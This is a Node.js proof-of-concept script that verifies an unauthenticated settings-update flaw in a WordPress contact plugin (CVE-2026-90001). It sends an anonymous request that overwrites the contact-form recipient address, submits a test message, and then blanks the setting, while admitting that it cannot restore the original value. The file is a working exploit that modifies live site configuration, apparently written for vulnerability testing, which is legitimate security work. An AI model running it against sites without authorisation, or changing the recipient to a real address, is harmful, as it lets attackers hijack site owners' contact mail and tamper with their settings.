#!/usr/bin/env node
// Exploit-verification probe for:
//   Quick Contact <= 1.0.0 - Missing Authorization to Unauthenticated Settings Update
//   (CVE-2026-90001)
//
// The plugin registers the `qc_save_settings` AJAX action for both
// `wp_ajax_qc_save_settings` and `wp_ajax_nopriv_qc_save_settings`, and the
// handler updates the `qc_recipient` option directly from $_REQUEST without
// any capability check (e.g. current_user_can) or nonce check
// (check_ajax_referer). That means any unauthenticated visitor can change
// the address contact-form submissions are sent to.
//
// This script attempts exactly that as an anonymous client (no cookies, no
// nonce) against admin-ajax.php on the target base URL, and treats a
// successful, unauthenticated settings change as proof of the
// vulnerability. It only talks to the provided base URL.
//
// Usage: node probe.mjs <base-url>
// Exit code 0 => target is vulnerable
// Exit code 1 => target is NOT vulnerable (looks patched / inconclusive-safe)

const baseUrlArg = process.argv[2];

if (!baseUrlArg) {
  console.error('Usage: node probe.mjs <base-url>');
  process.exit(1);
}

let base;
try {
  base = new URL(baseUrlArg);
} catch {
  console.error(`Invalid base URL: ${baseUrlArg}`);
  process.exit(1);
}

const ajaxUrl = new URL('/wp-admin/admin-ajax.php', base).toString();

// Random, clearly-fake marker values so we never collide with a real
// pre-existing setting, and so we can tell our own writes apart from
// anything else on the target.
const marker = Math.random().toString(36).slice(2, 10);
const probeRecipient = `qc-probe-${marker}@example.invalid`;

async function postAjax(params) {
  const body = new URLSearchParams(params);
  let res;
  try {
    res = await fetch(ajaxUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        // Explicitly no cookies / nonce — this must look like a totally
        // anonymous, unauthenticated request.
      },
      body: body.toString(),
      redirect: 'manual',
    });
  } catch (err) {
    return { ok: false, status: 0, json: null, text: '', error: err };
  }

  const text = await res.text().catch(() => '');
  let json = null;
  try {
    json = JSON.parse(text);
  } catch {
    // not JSON; leave json null
  }

  return { ok: res.ok, status: res.status, json, text };
}

function isAjaxSuccess(result) {
  return (
    result.ok &&
    result.status === 200 &&
    result.json &&
    result.json.success === true
  );
}

(async () => {
  // Step 1: attempt the unauthenticated privileged write.
  const attempt = await postAjax({
    action: 'qc_save_settings',
    recipient: probeRecipient,
  });

  const vulnerable = isAjaxSuccess(attempt);

  if (!vulnerable) {
    console.log('qc_save_settings rejected the unauthenticated request (or responded unexpectedly).');
    console.log(`  HTTP status: ${attempt.status}`);
    console.log(`  Body: ${attempt.text.slice(0, 300)}`);
    console.log('Target does NOT appear vulnerable.');
    process.exit(1);
  }

  console.log('Unauthenticated request to qc_save_settings succeeded:');
  console.log(`  HTTP status: ${attempt.status}`);
  console.log(`  Body: ${attempt.text.slice(0, 300)}`);

  // Step 2 (corroboration): submit the public contact form endpoint and
  // confirm it still accepts messages normally, which is consistent with
  // the vulnerable plugin's qc_send handler reading the (now attacker-
  // controlled) qc_recipient option we just overwrote above. This isn't a
  // disclosure of the stored value (the plugin exposes no such read
  // endpoint to an anonymous caller), but it confirms the write-path is
  // live and the plugin is functioning as the vulnerable version does.
  const sendResult = await postAjax({
    action: 'qc_send',
    name: 'probe',
    message: `vulnerability probe ${marker}`,
  });

  if (isAjaxSuccess(sendResult)) {
    console.log('Confirmed qc_send endpoint is live and using settings written by an anonymous caller.');
  } else {
    console.log('Note: corroborating qc_send call did not succeed as expected, but the unauthorized settings write already succeeded, which is the vulnerability.');
  }

  // Best-effort cleanup: we have no unauthenticated way to read back the
  // site's original qc_recipient value (the vulnerable plugin exposes no
  // such read endpoint), so we cannot restore the exact prior value.
  // As a best effort, clear the option back to an empty string so it no
  // longer points at our probe address; the handler's own fallback
  // (defaulting to admin_email) will then apply again, which is the
  // closest practical approximation of the original state.
  const cleanup = await postAjax({
    action: 'qc_save_settings',
    recipient: '',
  });
  if (isAjaxSuccess(cleanup)) {
    console.log('Best-effort cleanup: cleared qc_recipient back to empty (falls back to admin_email).');
  } else {
    console.log('Best-effort cleanup attempt did not confirm success; manual check may be needed.');
  }

  console.log('Target IS vulnerable (unauthenticated qc_save_settings write succeeded).');
  process.exit(0);
})().catch((err) => {
  console.error('Probe error:', err);
  process.exit(1);
});
